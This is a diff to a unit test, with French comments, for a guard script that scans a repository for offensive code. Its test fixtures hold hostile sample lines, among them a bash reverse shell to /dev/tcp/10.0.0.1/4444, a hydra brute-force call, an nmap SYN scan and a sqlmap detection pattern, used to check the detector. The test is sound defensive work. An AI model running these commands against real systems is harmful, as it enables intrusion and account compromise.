@@ -27,7 +27,7 @@ OFFENSIVE_SAMPLES: tuple[tuple[str, str], ...] = (
     ("reverse_shell.py", 'payload = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"\n'),
     ("brute_force.py", 'subprocess.run(["hydra", "-l", "admin", "-P", "words.txt", "cible"])\n'),
     ("scanner.py", 'subprocess.run(["nmap", "-sS", "192.0.2.0/24"])\n'),
-    ("exploit.py", 'meterpreter_session = connect(target)\n'),
+    ("exploit.py", "meterpreter_session = connect(target)\n"),
 )
 
 
@@ -37,7 +37,7 @@ class NoOffensiveCapabilityTest(unittest.TestCase):
 
     def test_repository_contains_no_offensive_capability(self) -> None:
         """Le dépôt livré ne doit contenir aucune construction offensive."""
-        completed = subprocess.run(  # noqa: S603 - script local, arguments fixes
+        completed = subprocess.run(
             [sys.executable, str(GUARD), str(REPO_ROOT)],
             capture_output=True,
             text=True,
@@ -67,7 +67,7 @@ class NoOffensiveCapabilityTest(unittest.TestCase):
             for filename, content in OFFENSIVE_SAMPLES:
                 target = sandbox / "src" / filename
                 target.write_text(content, encoding="utf-8")
-                completed = subprocess.run(  # noqa: S603
+                completed = subprocess.run(
                     [sys.executable, str(sandbox / "scripts" / GUARD.name), str(sandbox)],
                     capture_output=True,
                     text=True,
@@ -95,7 +95,7 @@ class NoOffensiveCapabilityTest(unittest.TestCase):
                 'PATTERN = r"sqlmap -u"\n',
                 encoding="utf-8",
             )
-            completed = subprocess.run(  # noqa: S603
+            completed = subprocess.run(
                 [sys.executable, str(sandbox / "scripts" / GUARD.name), str(sandbox)],
                 capture_output=True,
                 text=True,
